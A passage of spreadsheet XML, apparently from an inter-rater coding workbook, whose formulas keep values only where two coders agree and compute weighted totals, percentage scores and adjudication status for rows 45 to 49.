        <f>IF(AND(Coder1!O45&amp;""&lt;&gt;"",Coder1!O45&amp;""=Coder2!O45&amp;""),Coder1!O45,"")</f>
        <v/>
      </c>
      <c r="P45" s="14">
        <f>IF(AND(Coder1!P45&amp;""&lt;&gt;"",Coder1!P45&amp;""=Coder2!P45&amp;""),Coder1!P45,"")</f>
        <v/>
      </c>
      <c r="Q45" s="14">
        <f>IF(AND(Coder1!Q45&amp;""&lt;&gt;"",Coder1!Q45&amp;""=Coder2!Q45&amp;""),Coder1!Q45,"")</f>
        <v/>
      </c>
      <c r="R45" s="14">
        <f>IF(AND(Coder1!R45&amp;""&lt;&gt;"",Coder1!R45&amp;""=Coder2!R45&amp;""),Coder1!R45,"")</f>
        <v/>
      </c>
      <c r="S45" s="14">
        <f>IF(AND(Coder1!S45&amp;""&lt;&gt;"",Coder1!S45&amp;""=Coder2!S45&amp;""),Coder1!S45,"")</f>
        <v/>
      </c>
      <c r="T45" s="14">
        <f>IF(AND(Coder1!T45&amp;""&lt;&gt;"",Coder1!T45&amp;""=Coder2!T45&amp;""),Coder1!T45,"")</f>
        <v/>
      </c>
      <c r="U45" s="14">
        <f>IF(AND(Coder1!U45&amp;""&lt;&gt;"",Coder1!U45&amp;""=Coder2!U45&amp;""),Coder1!U45,"")</f>
        <v/>
      </c>
      <c r="V45" s="14">
        <f>IF(AND(Coder1!V45&amp;""&lt;&gt;"",Coder1!V45&amp;""=Coder2!V45&amp;""),Coder1!V45,"")</f>
        <v/>
      </c>
      <c r="W45" s="14">
        <f>IF(AND(Coder1!W45&amp;""&lt;&gt;"",Coder1!W45&amp;""=Coder2!W45&amp;""),Coder1!W45,"")</f>
        <v/>
      </c>
      <c r="X45" s="14">
        <f>IF(AND(Coder1!X45&amp;""&lt;&gt;"",Coder1!X45&amp;""=Coder2!X45&amp;""),Coder1!X45,"")</f>
        <v/>
      </c>
      <c r="Y45" s="14">
        <f>IF(AND(Coder1!Y45&amp;""&lt;&gt;"",Coder1!Y45&amp;""=Coder2!Y45&amp;""),Coder1!Y45,"")</f>
        <v/>
      </c>
      <c r="Z45" s="14">
        <f>IF(AND(Coder1!Z45&amp;""&lt;&gt;"",Coder1!Z45&amp;""=Coder2!Z45&amp;""),Coder1!Z45,"")</f>
        <v/>
      </c>
      <c r="AA45" s="14">
        <f>IF(AND(Coder1!AA45&amp;""&lt;&gt;"",Coder1!AA45&amp;""=Coder2!AA45&amp;""),Coder1!AA45,"")</f>
        <v/>
      </c>
      <c r="AB45" s="14">
        <f>IF(AND(Coder1!AB45&amp;""&lt;&gt;"",Coder1!AB45&amp;""=Coder2!AB45&amp;""),Coder1!AB45,"")</f>
        <v/>
      </c>
      <c r="AC45" s="14">
        <f>IF(AND(Coder1!AC45&amp;""&lt;&gt;"",Coder1!AC45&amp;""=Coder2!AC45&amp;""),Coder1!AC45,"")</f>
        <v/>
      </c>
      <c r="AD45" s="14">
        <f>IF(AND(Coder1!AD45&amp;""&lt;&gt;"",Coder1!AD45&amp;""=Coder2!AD45&amp;""),Coder1!AD45,"")</f>
        <v/>
      </c>
      <c r="AE45" s="14">
        <f>IF(AND(Coder1!AE45&amp;""&lt;&gt;"",Coder1!AE45&amp;""=Coder2!AE45&amp;""),Coder1!AE45,"")</f>
        <v/>
      </c>
      <c r="AF45" s="14">
        <f>IF(AND(Coder1!AF45&amp;""&lt;&gt;"",Coder1!AF45&amp;""=Coder2!AF45&amp;""),Coder1!AF45,"")</f>
        <v/>
      </c>
      <c r="AG45" s="14">
        <f>IF(AND(Coder1!AG45&amp;""&lt;&gt;"",Coder1!AG45&amp;""=Coder2!AG45&amp;""),Coder1!AG45,"")</f>
        <v/>
      </c>
      <c r="AH45" s="14">
        <f>IF(AND(Coder1!AH45&amp;""&lt;&gt;"",Coder1!AH45&amp;""=Coder2!AH45&amp;""),Coder1!AH45,"")</f>
        <v/>
      </c>
      <c r="AI45" s="11">
        <f>IF(COUNT(E45:L45)=0,"",SUM(E45:L45))</f>
        <v/>
      </c>
      <c r="AJ45" s="11">
        <f>IF(AI45="","",N(E45)*3+N(F45)*2+N(G45)*2+N(H45)*2+N(I45)*2+N(J45)*3+N(K45)*3+N(L45)*3)</f>
        <v/>
      </c>
      <c r="AK45" s="11">
        <f>IF(AI45="","",COUNTIF(N45:AG45,1))</f>
        <v/>
      </c>
      <c r="AL45" s="11">
        <f>IF(OR(AJ45="",AJ45=0),"",ROUND(100*(AJ45-AK45)/AJ45,1))</f>
        <v/>
      </c>
      <c r="AM45" s="11">
        <f>IF(AND(Coder1!AN45=1,Coder2!AN45=1),IF(COUNTBLANK(E45:AH45)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN45" s="11">
        <f>IF(AND(Coder1!AN45=1,Coder2!AN45=1),IF(SUMPRODUCT(--(Coder1!E45:AH45&amp;""&lt;&gt;Coder2!E45:AH45&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO45" s="11" t="n"/>
    </row>
    <row r="46">
      <c r="A46" s="11">
        <f>Coder1!A46</f>
        <v/>
      </c>
      <c r="B46" s="11">
        <f>Coder1!B46</f>
        <v/>
      </c>
      <c r="C46" s="11">
        <f>Coder1!C46</f>
        <v/>
      </c>
      <c r="D46" s="11">
        <f>Coder1!D46</f>
        <v/>
      </c>
      <c r="E46" s="14">
        <f>IF(AND(Coder1!E46&amp;""&lt;&gt;"",Coder1!E46&amp;""=Coder2!E46&amp;""),Coder1!E46,"")</f>
        <v/>
      </c>
      <c r="F46" s="14">
        <f>IF(AND(Coder1!F46&amp;""&lt;&gt;"",Coder1!F46&amp;""=Coder2!F46&amp;""),Coder1!F46,"")</f>
        <v/>
      </c>
      <c r="G46" s="14">
        <f>IF(AND(Coder1!G46&amp;""&lt;&gt;"",Coder1!G46&amp;""=Coder2!G46&amp;""),Coder1!G46,"")</f>
        <v/>
      </c>
      <c r="H46" s="14">
        <f>IF(AND(Coder1!H46&amp;""&lt;&gt;"",Coder1!H46&amp;""=Coder2!H46&amp;""),Coder1!H46,"")</f>
        <v/>
      </c>
      <c r="I46" s="14">
        <f>IF(AND(Coder1!I46&amp;""&lt;&gt;"",Coder1!I46&amp;""=Coder2!I46&amp;""),Coder1!I46,"")</f>
        <v/>
      </c>
      <c r="J46" s="14">
        <f>IF(AND(Coder1!J46&amp;""&lt;&gt;"",Coder1!J46&amp;""=Coder2!J46&amp;""),Coder1!J46,"")</f>
        <v/>
      </c>
      <c r="K46" s="14">
        <f>IF(AND(Coder1!K46&amp;""&lt;&gt;"",Coder1!K46&amp;""=Coder2!K46&amp;""),Coder1!K46,"")</f>
        <v/>
      </c>
      <c r="L46" s="14">
        <f>IF(AND(Coder1!L46&amp;""&lt;&gt;"",Coder1!L46&amp;""=Coder2!L46&amp;""),Coder1!L46,"")</f>
        <v/>
      </c>
      <c r="M46" s="14">
        <f>IF(AND(Coder1!M46&amp;""&lt;&gt;"",Coder1!M46&amp;""=Coder2!M46&amp;""),Coder1!M46,"")</f>
        <v/>
      </c>
      <c r="N46" s="14">
        <f>IF(AND(Coder1!N46&amp;""&lt;&gt;"",Coder1!N46&amp;""=Coder2!N46&amp;""),Coder1!N46,"")</f>
        <v/>
      </c>
      <c r="O46" s="14">
        <f>IF(AND(Coder1!O46&amp;""&lt;&gt;"",Coder1!O46&amp;""=Coder2!O46&amp;""),Coder1!O46,"")</f>
        <v/>
      </c>
      <c r="P46" s="14">
        <f>IF(AND(Coder1!P46&amp;""&lt;&gt;"",Coder1!P46&amp;""=Coder2!P46&amp;""),Coder1!P46,"")</f>
        <v/>
      </c>
      <c r="Q46" s="14">
        <f>IF(AND(Coder1!Q46&amp;""&lt;&gt;"",Coder1!Q46&amp;""=Coder2!Q46&amp;""),Coder1!Q46,"")</f>
        <v/>
      </c>
      <c r="R46" s="14">
        <f>IF(AND(Coder1!R46&amp;""&lt;&gt;"",Coder1!R46&amp;""=Coder2!R46&amp;""),Coder1!R46,"")</f>
        <v/>
      </c>
      <c r="S46" s="14">
        <f>IF(AND(Coder1!S46&amp;""&lt;&gt;"",Coder1!S46&amp;""=Coder2!S46&amp;""),Coder1!S46,"")</f>
        <v/>
      </c>
      <c r="T46" s="14">
        <f>IF(AND(Coder1!T46&amp;""&lt;&gt;"",Coder1!T46&amp;""=Coder2!T46&amp;""),Coder1!T46,"")</f>
        <v/>
      </c>
      <c r="U46" s="14">
        <f>IF(AND(Coder1!U46&amp;""&lt;&gt;"",Coder1!U46&amp;""=Coder2!U46&amp;""),Coder1!U46,"")</f>
        <v/>
      </c>
      <c r="V46" s="14">
        <f>IF(AND(Coder1!V46&amp;""&lt;&gt;"",Coder1!V46&amp;""=Coder2!V46&amp;""),Coder1!V46,"")</f>
        <v/>
      </c>
      <c r="W46" s="14">
        <f>IF(AND(Coder1!W46&amp;""&lt;&gt;"",Coder1!W46&amp;""=Coder2!W46&amp;""),Coder1!W46,"")</f>
        <v/>
      </c>
      <c r="X46" s="14">
        <f>IF(AND(Coder1!X46&amp;""&lt;&gt;"",Coder1!X46&amp;""=Coder2!X46&amp;""),Coder1!X46,"")</f>
        <v/>
      </c>
      <c r="Y46" s="14">
        <f>IF(AND(Coder1!Y46&amp;""&lt;&gt;"",Coder1!Y46&amp;""=Coder2!Y46&amp;""),Coder1!Y46,"")</f>
        <v/>
      </c>
      <c r="Z46" s="14">
        <f>IF(AND(Coder1!Z46&amp;""&lt;&gt;"",Coder1!Z46&amp;""=Coder2!Z46&amp;""),Coder1!Z46,"")</f>
        <v/>
      </c>
      <c r="AA46" s="14">
        <f>IF(AND(Coder1!AA46&amp;""&lt;&gt;"",Coder1!AA46&amp;""=Coder2!AA46&amp;""),Coder1!AA46,"")</f>
        <v/>
      </c>
      <c r="AB46" s="14">
        <f>IF(AND(Coder1!AB46&amp;""&lt;&gt;"",Coder1!AB46&amp;""=Coder2!AB46&amp;""),Coder1!AB46,"")</f>
        <v/>
      </c>
      <c r="AC46" s="14">
        <f>IF(AND(Coder1!AC46&amp;""&lt;&gt;"",Coder1!AC46&amp;""=Coder2!AC46&amp;""),Coder1!AC46,"")</f>
        <v/>
      </c>
      <c r="AD46" s="14">
        <f>IF(AND(Coder1!AD46&amp;""&lt;&gt;"",Coder1!AD46&amp;""=Coder2!AD46&amp;""),Coder1!AD46,"")</f>
        <v/>
      </c>
      <c r="AE46" s="14">
        <f>IF(AND(Coder1!AE46&amp;""&lt;&gt;"",Coder1!AE46&amp;""=Coder2!AE46&amp;""),Coder1!AE46,"")</f>
        <v/>
      </c>
      <c r="AF46" s="14">
        <f>IF(AND(Coder1!AF46&amp;""&lt;&gt;"",Coder1!AF46&amp;""=Coder2!AF46&amp;""),Coder1!AF46,"")</f>
        <v/>
      </c>
      <c r="AG46" s="14">
        <f>IF(AND(Coder1!AG46&amp;""&lt;&gt;"",Coder1!AG46&amp;""=Coder2!AG46&amp;""),Coder1!AG46,"")</f>
        <v/>
      </c>
      <c r="AH46" s="14">
        <f>IF(AND(Coder1!AH46&amp;""&lt;&gt;"",Coder1!AH46&amp;""=Coder2!AH46&amp;""),Coder1!AH46,"")</f>
        <v/>
      </c>
      <c r="AI46" s="11">
        <f>IF(COUNT(E46:L46)=0,"",SUM(E46:L46))</f>
        <v/>
      </c>
      <c r="AJ46" s="11">
        <f>IF(AI46="","",N(E46)*3+N(F46)*2+N(G46)*2+N(H46)*2+N(I46)*2+N(J46)*3+N(K46)*3+N(L46)*3)</f>
        <v/>
      </c>
      <c r="AK46" s="11">
        <f>IF(AI46="","",COUNTIF(N46:AG46,1))</f>
        <v/>
      </c>
      <c r="AL46" s="11">
        <f>IF(OR(AJ46="",AJ46=0),"",ROUND(100*(AJ46-AK46)/AJ46,1))</f>
        <v/>
      </c>
      <c r="AM46" s="11">
        <f>IF(AND(Coder1!AN46=1,Coder2!AN46=1),IF(COUNTBLANK(E46:AH46)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN46" s="11">
        <f>IF(AND(Coder1!AN46=1,Coder2!AN46=1),IF(SUMPRODUCT(--(Coder1!E46:AH46&amp;""&lt;&gt;Coder2!E46:AH46&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO46" s="11" t="n"/>
    </row>
    <row r="47">
      <c r="A47" s="11">
        <f>Coder1!A47</f>
        <v/>
      </c>
      <c r="B47" s="11">
        <f>Coder1!B47</f>
        <v/>
      </c>
      <c r="C47" s="11">
        <f>Coder1!C47</f>
        <v/>
      </c>
      <c r="D47" s="11">
        <f>Coder1!D47</f>
        <v/>
      </c>
      <c r="E47" s="14">
        <f>IF(AND(Coder1!E47&amp;""&lt;&gt;"",Coder1!E47&amp;""=Coder2!E47&amp;""),Coder1!E47,"")</f>
        <v/>
      </c>
      <c r="F47" s="14">
        <f>IF(AND(Coder1!F47&amp;""&lt;&gt;"",Coder1!F47&amp;""=Coder2!F47&amp;""),Coder1!F47,"")</f>
        <v/>
      </c>
      <c r="G47" s="14">
        <f>IF(AND(Coder1!G47&amp;""&lt;&gt;"",Coder1!G47&amp;""=Coder2!G47&amp;""),Coder1!G47,"")</f>
        <v/>
      </c>
      <c r="H47" s="14">
        <f>IF(AND(Coder1!H47&amp;""&lt;&gt;"",Coder1!H47&amp;""=Coder2!H47&amp;""),Coder1!H47,"")</f>
        <v/>
      </c>
      <c r="I47" s="14">
        <f>IF(AND(Coder1!I47&amp;""&lt;&gt;"",Coder1!I47&amp;""=Coder2!I47&amp;""),Coder1!I47,"")</f>
        <v/>
      </c>
      <c r="J47" s="14">
        <f>IF(AND(Coder1!J47&amp;""&lt;&gt;"",Coder1!J47&amp;""=Coder2!J47&amp;""),Coder1!J47,"")</f>
        <v/>
      </c>
      <c r="K47" s="14">
        <f>IF(AND(Coder1!K47&amp;""&lt;&gt;"",Coder1!K47&amp;""=Coder2!K47&amp;""),Coder1!K47,"")</f>
        <v/>
      </c>
      <c r="L47" s="14">
        <f>IF(AND(Coder1!L47&amp;""&lt;&gt;"",Coder1!L47&amp;""=Coder2!L47&amp;""),Coder1!L47,"")</f>
        <v/>
      </c>
      <c r="M47" s="14">
        <f>IF(AND(Coder1!M47&amp;""&lt;&gt;"",Coder1!M47&amp;""=Coder2!M47&amp;""),Coder1!M47,"")</f>
        <v/>
      </c>
      <c r="N47" s="14">
        <f>IF(AND(Coder1!N47&amp;""&lt;&gt;"",Coder1!N47&amp;""=Coder2!N47&amp;""),Coder1!N47,"")</f>
        <v/>
      </c>
      <c r="O47" s="14">
        <f>IF(AND(Coder1!O47&amp;""&lt;&gt;"",Coder1!O47&amp;""=Coder2!O47&amp;""),Coder1!O47,"")</f>
        <v/>
      </c>
      <c r="P47" s="14">
        <f>IF(AND(Coder1!P47&amp;""&lt;&gt;"",Coder1!P47&amp;""=Coder2!P47&amp;""),Coder1!P47,"")</f>
        <v/>
      </c>
      <c r="Q47" s="14">
        <f>IF(AND(Coder1!Q47&amp;""&lt;&gt;"",Coder1!Q47&amp;""=Coder2!Q47&amp;""),Coder1!Q47,"")</f>
        <v/>
      </c>
      <c r="R47" s="14">
        <f>IF(AND(Coder1!R47&amp;""&lt;&gt;"",Coder1!R47&amp;""=Coder2!R47&amp;""),Coder1!R47,"")</f>
        <v/>
      </c>
      <c r="S47" s="14">
        <f>IF(AND(Coder1!S47&amp;""&lt;&gt;"",Coder1!S47&amp;""=Coder2!S47&amp;""),Coder1!S47,"")</f>
        <v/>
      </c>
      <c r="T47" s="14">
        <f>IF(AND(Coder1!T47&amp;""&lt;&gt;"",Coder1!T47&amp;""=Coder2!T47&amp;""),Coder1!T47,"")</f>
        <v/>
      </c>
      <c r="U47" s="14">
        <f>IF(AND(Coder1!U47&amp;""&lt;&gt;"",Coder1!U47&amp;""=Coder2!U47&amp;""),Coder1!U47,"")</f>
        <v/>
      </c>
      <c r="V47" s="14">
        <f>IF(AND(Coder1!V47&amp;""&lt;&gt;"",Coder1!V47&amp;""=Coder2!V47&amp;""),Coder1!V47,"")</f>
        <v/>
      </c>
      <c r="W47" s="14">
        <f>IF(AND(Coder1!W47&amp;""&lt;&gt;"",Coder1!W47&amp;""=Coder2!W47&amp;""),Coder1!W47,"")</f>
        <v/>
      </c>
      <c r="X47" s="14">
        <f>IF(AND(Coder1!X47&amp;""&lt;&gt;"",Coder1!X47&amp;""=Coder2!X47&amp;""),Coder1!X47,"")</f>
        <v/>
      </c>
      <c r="Y47" s="14">
        <f>IF(AND(Coder1!Y47&amp;""&lt;&gt;"",Coder1!Y47&amp;""=Coder2!Y47&amp;""),Coder1!Y47,"")</f>
        <v/>
      </c>
      <c r="Z47" s="14">
        <f>IF(AND(Coder1!Z47&amp;""&lt;&gt;"",Coder1!Z47&amp;""=Coder2!Z47&amp;""),Coder1!Z47,"")</f>
        <v/>
      </c>
      <c r="AA47" s="14">
        <f>IF(AND(Coder1!AA47&amp;""&lt;&gt;"",Coder1!AA47&amp;""=Coder2!AA47&amp;""),Coder1!AA47,"")</f>
        <v/>
      </c>
      <c r="AB47" s="14">
        <f>IF(AND(Coder1!AB47&amp;""&lt;&gt;"",Coder1!AB47&amp;""=Coder2!AB47&amp;""),Coder1!AB47,"")</f>
        <v/>
      </c>
      <c r="AC47" s="14">
        <f>IF(AND(Coder1!AC47&amp;""&lt;&gt;"",Coder1!AC47&amp;""=Coder2!AC47&amp;""),Coder1!AC47,"")</f>
        <v/>
      </c>
      <c r="AD47" s="14">
        <f>IF(AND(Coder1!AD47&amp;""&lt;&gt;"",Coder1!AD47&amp;""=Coder2!AD47&amp;""),Coder1!AD47,"")</f>
        <v/>
      </c>
      <c r="AE47" s="14">
        <f>IF(AND(Coder1!AE47&amp;""&lt;&gt;"",Coder1!AE47&amp;""=Coder2!AE47&amp;""),Coder1!AE47,"")</f>
        <v/>
      </c>
      <c r="AF47" s="14">
        <f>IF(AND(Coder1!AF47&amp;""&lt;&gt;"",Coder1!AF47&amp;""=Coder2!AF47&amp;""),Coder1!AF47,"")</f>
        <v/>
      </c>
      <c r="AG47" s="14">
        <f>IF(AND(Coder1!AG47&amp;""&lt;&gt;"",Coder1!AG47&amp;""=Coder2!AG47&amp;""),Coder1!AG47,"")</f>
        <v/>
      </c>
      <c r="AH47" s="14">
        <f>IF(AND(Coder1!AH47&amp;""&lt;&gt;"",Coder1!AH47&amp;""=Coder2!AH47&amp;""),Coder1!AH47,"")</f>
        <v/>
      </c>
      <c r="AI47" s="11">
        <f>IF(COUNT(E47:L47)=0,"",SUM(E47:L47))</f>
        <v/>
      </c>
      <c r="AJ47" s="11">
        <f>IF(AI47="","",N(E47)*3+N(F47)*2+N(G47)*2+N(H47)*2+N(I47)*2+N(J47)*3+N(K47)*3+N(L47)*3)</f>
        <v/>
      </c>
      <c r="AK47" s="11">
        <f>IF(AI47="","",COUNTIF(N47:AG47,1))</f>
        <v/>
      </c>
      <c r="AL47" s="11">
        <f>IF(OR(AJ47="",AJ47=0),"",ROUND(100*(AJ47-AK47)/AJ47,1))</f>
        <v/>
      </c>
      <c r="AM47" s="11">
        <f>IF(AND(Coder1!AN47=1,Coder2!AN47=1),IF(COUNTBLANK(E47:AH47)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN47" s="11">
        <f>IF(AND(Coder1!AN47=1,Coder2!AN47=1),IF(SUMPRODUCT(--(Coder1!E47:AH47&amp;""&lt;&gt;Coder2!E47:AH47&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO47" s="11" t="n"/>
    </row>
    <row r="48">
      <c r="A48" s="11">
        <f>Coder1!A48</f>
        <v/>
      </c>
      <c r="B48" s="11">
        <f>Coder1!B48</f>
        <v/>
      </c>
      <c r="C48" s="11">
        <f>Coder1!C48</f>
        <v/>
      </c>
      <c r="D48" s="11">
        <f>Coder1!D48</f>
        <v/>
      </c>
      <c r="E48" s="14">
        <f>IF(AND(Coder1!E48&amp;""&lt;&gt;"",Coder1!E48&amp;""=Coder2!E48&amp;""),Coder1!E48,"")</f>
        <v/>
      </c>
      <c r="F48" s="14">
        <f>IF(AND(Coder1!F48&amp;""&lt;&gt;"",Coder1!F48&amp;""=Coder2!F48&amp;""),Coder1!F48,"")</f>
        <v/>
      </c>
      <c r="G48" s="14">
        <f>IF(AND(Coder1!G48&amp;""&lt;&gt;"",Coder1!G48&amp;""=Coder2!G48&amp;""),Coder1!G48,"")</f>
        <v/>
      </c>
      <c r="H48" s="14">
        <f>IF(AND(Coder1!H48&amp;""&lt;&gt;"",Coder1!H48&amp;""=Coder2!H48&amp;""),Coder1!H48,"")</f>
        <v/>
      </c>
      <c r="I48" s="14">
        <f>IF(AND(Coder1!I48&amp;""&lt;&gt;"",Coder1!I48&amp;""=Coder2!I48&amp;""),Coder1!I48,"")</f>
        <v/>
      </c>
      <c r="J48" s="14">
        <f>IF(AND(Coder1!J48&amp;""&lt;&gt;"",Coder1!J48&amp;""=Coder2!J48&amp;""),Coder1!J48,"")</f>
        <v/>
      </c>
      <c r="K48" s="14">
        <f>IF(AND(Coder1!K48&amp;""&lt;&gt;"",Coder1!K48&amp;""=Coder2!K48&amp;""),Coder1!K48,"")</f>
        <v/>
      </c>
      <c r="L48" s="14">
        <f>IF(AND(Coder1!L48&amp;""&lt;&gt;"",Coder1!L48&amp;""=Coder2!L48&amp;""),Coder1!L48,"")</f>
        <v/>
      </c>
      <c r="M48" s="14">
        <f>IF(AND(Coder1!M48&amp;""&lt;&gt;"",Coder1!M48&amp;""=Coder2!M48&amp;""),Coder1!M48,"")</f>
        <v/>
      </c>
      <c r="N48" s="14">
        <f>IF(AND(Coder1!N48&amp;""&lt;&gt;"",Coder1!N48&amp;""=Coder2!N48&amp;""),Coder1!N48,"")</f>
        <v/>
      </c>
      <c r="O48" s="14">
        <f>IF(AND(Coder1!O48&amp;""&lt;&gt;"",Coder1!O48&amp;""=Coder2!O48&amp;""),Coder1!O48,"")</f>
        <v/>
      </c>
      <c r="P48" s="14">
        <f>IF(AND(Coder1!P48&amp;""&lt;&gt;"",Coder1!P48&amp;""=Coder2!P48&amp;""),Coder1!P48,"")</f>
        <v/>
      </c>
      <c r="Q48" s="14">
        <f>IF(AND(Coder1!Q48&amp;""&lt;&gt;"",Coder1!Q48&amp;""=Coder2!Q48&amp;""),Coder1!Q48,"")</f>
        <v/>
      </c>
      <c r="R48" s="14">
        <f>IF(AND(Coder1!R48&amp;""&lt;&gt;"",Coder1!R48&amp;""=Coder2!R48&amp;""),Coder1!R48,"")</f>
        <v/>
      </c>
      <c r="S48" s="14">
        <f>IF(AND(Coder1!S48&amp;""&lt;&gt;"",Coder1!S48&amp;""=Coder2!S48&amp;""),Coder1!S48,"")</f>
        <v/>
      </c>
      <c r="T48" s="14">
        <f>IF(AND(Coder1!T48&amp;""&lt;&gt;"",Coder1!T48&amp;""=Coder2!T48&amp;""),Coder1!T48,"")</f>
        <v/>
      </c>
      <c r="U48" s="14">
        <f>IF(AND(Coder1!U48&amp;""&lt;&gt;"",Coder1!U48&amp;""=Coder2!U48&amp;""),Coder1!U48,"")</f>
        <v/>
      </c>
      <c r="V48" s="14">
        <f>IF(AND(Coder1!V48&amp;""&lt;&gt;"",Coder1!V48&amp;""=Coder2!V48&amp;""),Coder1!V48,"")</f>
        <v/>
      </c>
      <c r="W48" s="14">
        <f>IF(AND(Coder1!W48&amp;""&lt;&gt;"",Coder1!W48&amp;""=Coder2!W48&amp;""),Coder1!W48,"")</f>
        <v/>
      </c>
      <c r="X48" s="14">
        <f>IF(AND(Coder1!X48&amp;""&lt;&gt;"",Coder1!X48&amp;""=Coder2!X48&amp;""),Coder1!X48,"")</f>
        <v/>
      </c>
      <c r="Y48" s="14">
        <f>IF(AND(Coder1!Y48&amp;""&lt;&gt;"",Coder1!Y48&amp;""=Coder2!Y48&amp;""),Coder1!Y48,"")</f>
        <v/>
      </c>
      <c r="Z48" s="14">
        <f>IF(AND(Coder1!Z48&amp;""&lt;&gt;"",Coder1!Z48&amp;""=Coder2!Z48&amp;""),Coder1!Z48,"")</f>
        <v/>
      </c>
      <c r="AA48" s="14">
        <f>IF(AND(Coder1!AA48&amp;""&lt;&gt;"",Coder1!AA48&amp;""=Coder2!AA48&amp;""),Coder1!AA48,"")</f>
        <v/>
      </c>
      <c r="AB48" s="14">
        <f>IF(AND(Coder1!AB48&amp;""&lt;&gt;"",Coder1!AB48&amp;""=Coder2!AB48&amp;""),Coder1!AB48,"")</f>
        <v/>
      </c>
      <c r="AC48" s="14">
        <f>IF(AND(Coder1!AC48&amp;""&lt;&gt;"",Coder1!AC48&amp;""=Coder2!AC48&amp;""),Coder1!AC48,"")</f>
        <v/>
      </c>
      <c r="AD48" s="14">
        <f>IF(AND(Coder1!AD48&amp;""&lt;&gt;"",Coder1!AD48&amp;""=Coder2!AD48&amp;""),Coder1!AD48,"")</f>
        <v/>
      </c>
      <c r="AE48" s="14">
        <f>IF(AND(Coder1!AE48&amp;""&lt;&gt;"",Coder1!AE48&amp;""=Coder2!AE48&amp;""),Coder1!AE48,"")</f>
        <v/>
      </c>
      <c r="AF48" s="14">
        <f>IF(AND(Coder1!AF48&amp;""&lt;&gt;"",Coder1!AF48&amp;""=Coder2!AF48&amp;""),Coder1!AF48,"")</f>
        <v/>
      </c>
      <c r="AG48" s="14">
        <f>IF(AND(Coder1!AG48&amp;""&lt;&gt;"",Coder1!AG48&amp;""=Coder2!AG48&amp;""),Coder1!AG48,"")</f>
        <v/>
      </c>
      <c r="AH48" s="14">
        <f>IF(AND(Coder1!AH48&amp;""&lt;&gt;"",Coder1!AH48&amp;""=Coder2!AH48&amp;""),Coder1!AH48,"")</f>
        <v/>
      </c>
      <c r="AI48" s="11">
        <f>IF(COUNT(E48:L48)=0,"",SUM(E48:L48))</f>
        <v/>
      </c>
      <c r="AJ48" s="11">
        <f>IF(AI48="","",N(E48)*3+N(F48)*2+N(G48)*2+N(H48)*2+N(I48)*2+N(J48)*3+N(K48)*3+N(L48)*3)</f>
        <v/>
      </c>
      <c r="AK48" s="11">
        <f>IF(AI48="","",COUNTIF(N48:AG48,1))</f>
        <v/>
      </c>
      <c r="AL48" s="11">
        <f>IF(OR(AJ48="",AJ48=0),"",ROUND(100*(AJ48-AK48)/AJ48,1))</f>
        <v/>
      </c>
      <c r="AM48" s="11">
        <f>IF(AND(Coder1!AN48=1,Coder2!AN48=1),IF(COUNTBLANK(E48:AH48)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN48" s="11">
        <f>IF(AND(Coder1!AN48=1,Coder2!AN48=1),IF(SUMPRODUCT(--(Coder1!E48:AH48&amp;""&lt;&gt;Coder2!E48:AH48&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO48" s="11" t="n"/>
    </row>
    <row r="49">
      <c r="A49" s="11">
        <f>Coder1!A49</f>
        <v/>
      </c>
      <c r="B49" s="11">
        <f>Coder1!B49</f>
        <v/>
      </c>
      <c r="C49" s="11">
        <f>Coder1!C49</f>
        <v/>
      </c>
      <c r="D49" s="11">
        <f>Coder1!D49</f>
        <v/>
      </c>
      <c r="E49" s="14">
        <f>IF(AND(Coder1!E49&amp;""&lt;&gt;"",Coder1!E49&amp;""=Coder2!E49&amp;""),Coder1!E49,"")</f>
        <v/>
      </c>
      <c r="F49" s="14">
        <f>IF(AND(Coder1!F49&amp;""&lt;&gt;"",Coder1!F49&amp;""=Coder2!F49&amp;""),Coder1!F49,"")</f>
        <v/>
      </c>
      <c r="G49" s="14">
        <f>IF(AND(Coder1!G49&amp;""&lt;&gt;"",Coder1!G49&amp;""=Coder2!G49&amp;""),Coder1!G49,"")</f>
        <v/>
      </c>
      <c r="H49" s="14">
        <f>IF(AND(Coder1!H49&amp;""&lt;&gt;"",Coder1!H49&amp;""=Coder2!H49&amp;""),Coder1!H49,"")</f>
        <v/>
      </c>
      <c r="I49" s="14">
        <f>IF(AND(Coder1!I49&amp;""&lt;&gt;"",Coder1!I49&amp;""=Coder2!I49&amp;""),Coder1!I49,"")</f>
        <v/>
      </c>
      <c r="J49" s="14">
        <f>IF(AND(Coder1!J49&amp;""&lt;&gt;"",Coder1!J49&amp;""=Coder2!J49&amp;""),Coder1!J49,"")</f>
        <v/>
      </c>
      <c r="K49" s="14">
        <f>IF(AND(Coder1!K49&amp;""&lt;&gt;"",Coder1!K49&amp;""=Coder2!K49&amp;""),Coder1!K49,"")</f>
        <v/>
      </c>
      <c r="L49" s="14">
        <f>IF(AND(Coder1!L49&amp;""&lt;&gt;"",Coder1!L49&amp;""=Coder2!L49&amp;""),Coder1!L49,"")</f>
        <v/>
      </c>
      <c r="M49" s="14">
        <f>IF(AND(Coder1!M49&amp;""&lt;&gt;"",Coder1!M49&amp;""=Coder2!M49&amp;""),Coder1!M49,"")</f>
        <v/>
      </c>
      <c r="N49" s="14">
        <f>IF(AND(Coder1!N49&amp;""&lt;&gt;"",Coder1!N49&amp;""=Coder2!N49&amp;""),Coder1!N49,"")</f>
        <v/>
      </c>
      <c r="O49" s="14">
        <f>IF(AND(Coder1!O49&amp;""&lt;&gt;"",Coder1!O49&amp;""=Coder2!O49&amp;""),Coder1!O49,"")</f>
        <v/>
      </c>
      <c r="P49" s="14">
        <f>IF(AND(Coder1!P49&amp;""&lt;&gt;"",Coder1!P49&amp;""=Coder2!P49&amp;""),Coder1!P49,"")</f>
        <v/>
      </c>
      <c r="Q49" s="14">
        <f>IF(AND(Coder1!Q49&amp;""&lt;&gt;"",Coder1!Q49&amp;""=Coder2!Q49&amp;""),Coder1!Q49,"")</f>
        <v/>
      </c>
      <c r="R49" s="14">
